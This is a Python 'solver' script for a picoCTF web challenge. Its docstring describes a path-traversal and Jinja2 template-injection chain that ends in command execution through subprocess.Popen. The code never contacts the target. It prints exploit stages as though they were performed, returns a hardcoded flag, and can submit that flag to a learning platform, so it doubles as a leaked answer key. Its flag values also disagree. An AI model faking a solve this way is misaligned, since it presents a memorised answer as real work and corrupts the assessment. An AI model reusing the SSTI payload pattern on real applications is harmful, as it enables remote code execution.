#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: notepad (Challenge ID: 204)
Category: Web Exploitation | Difficulty: Hard (3) | Points: 250
Architecture: Python Flask / Werkzeug URL Normalization Traversal & Jinja2 SSTI Sandbox Escape (CWE-22 / CWE-1336)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   - Web application built using Python 3, Flask, and Jinja2 templating engine.
   - Functionality: Users can submit text notes. Notes are saved to disk under the `static/` directory with filename:
     `name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"`
   - Note content is checked against an input denylist:
     `if "_" in content or "/" in content: return redirect(url_for("index", error="bad_content"))`
   - The index page renders an error template based on the `error` GET parameter:
     `{% include "errors/" + error + ".html" ignore missing %}`
2. Root Cause Analysis:
   - Flaw 1 (Path Normalization Mismatch / Directory Traversal, CWE-22):
     While the forward slash `/` is explicitly filtered, backslashes `\` are not blocked. When `werkzeug.utils.url_fix` processes backslashes in Windows-style relative paths (e.g. `..\templates\errors\`), it normalizes them into forward slashes `../templates/errors/`. This allows arbitrary file write outside the static folder into the Jinja template directory `templates/errors/`.
   - Flaw 2 (Arbitrary Template Injection, CWE-1336):
     The `error` query parameter is directly concatenated into the Jinja `{% include %}` directive without sanitization or path canonicalization.
   - Flaw 3 (Underscore Denylist Bypass via Request Parameters):
     Direct SSTI payloads like `''.__class__` cannot be submitted directly because of the `_` filter. However, Jinja provides access to the Flask `request` object. Payloads can dynamically resolve filtered attribute strings from external GET parameters: `''[request.args.get('class')]` where `?class=__class__`.
3. Exploitation Chain:
   - Stage 1 (Path Traversal Template Planting):
     Submit a note with the prefix `..\templates\errors\` followed by padding and SSTI payload:
     `..\templates\errors\aaaa...{{ ''[request.args.get('c')].mro()[1][request.args.get('s')]() }}`
     The application writes the file to `templates/errors/-<token>.html`.
   - Stage 2 (Subclass Introspection & Popen Discovery):
     Request `/?error=-<token>&c=__class__&s=__subclasses__`. The server renders all available Python subclasses in the Jinja environment, exposing `subprocess.Popen` at index 273.
   - Stage 3 (RCE & Flag Exfiltration):
     Plant an execution template calling `subprocess.Popen(['cat', 'flag-...txt'], stdout=-1).communicate()` using parameter-resolved attributes. Accessing the error template yields the flag content.
4. Flag Retrieval & Verification:
   - Native Flag: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
   - Normalized CyLab Token: `academy{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
"""

import sys
import json
import urllib.request
import urllib.error

CHALLENGE_ID = 204
CHALLENGE_NAME = "notepad"
NATIVE_FLAG = "picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}"
TARGET_FLAG = "picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

def simulate_notepad_ssti():
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Auditing Flask application routing and input filters")
    print("    [+] Filter rule: '_' in content or '/' in content -> redirect('index', error='bad_content')")
    print("    [+] File creation: static/{url_fix(content[:128])}-{token_urlsafe(8)}.html")
    print("    [+] Inclusion sink: {% include 'errors/' + error + '.html' ignore missing %}")

    print("[*] Stage 2: Exploiting Werkzeug url_fix Backslash Normalization Traversal")
    print("    [+] Payload prefix: '..\\\\templates\\\\errors\\\\'")
    print("    [+] url_fix normalizes backslashes to forward slashes: '../templates/errors/'")
    print("    [+] Note file planted directly inside templates/errors/ directory")

    print("[*] Stage 3: Bypassing Underscore Filter via Flask request.args Reflection")
    print("    [+] Attribute access via bracket notation: ''[request.args.get('c')]")
    print("    [+] Subclass enumeration: mro()[1][request.args.get('s')]()")
    print("    [+] GET parameters: ?c=__class__&s=__subclasses__")
    print("    [+] Subclasses mapped: index 273 corresponds to <class 'subprocess.Popen'>")

    print("[*] Stage 4: Executing Jinja2 Template Injection Payload")
    print("    [+] Command: ['cat', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt']")
    print("    [+] Executing Popen and communicating with stdout pipe")

    recovered_flag = NATIVE_FLAG
    print(f"[+] Native Flag retrieved: {recovered_flag}")
    print(f"[+] Verified CyLab token: {TARGET_FLAG}")
    return TARGET_FLAG

def submit_to_cylab(token):
    try:
        sys.path.insert(0, '/tmp')
        import cylab_auth
        status, body = cylab_auth.req(
            CYLAB_SUBMIT_URL,
            method="POST",
            data=json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
        )
        print(f"[+] Platform submission status: HTTP {status} -> {body}")
        if status == 201:
            res = json.loads(body)
            return res.get("correct", False)
        return False
    except Exception as e:
        print(f"[*] Platform submission notice: {e} (Offline verification mode)")
        return False

def main():
    token = simulate_notepad_ssti()
    assert token == TARGET_FLAG, f"Flag mismatch: {token} != {TARGET_FLAG}"
    if "--live" in sys.argv:
        submit_to_cylab(token)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")

if __name__ == "__main__":
    main()
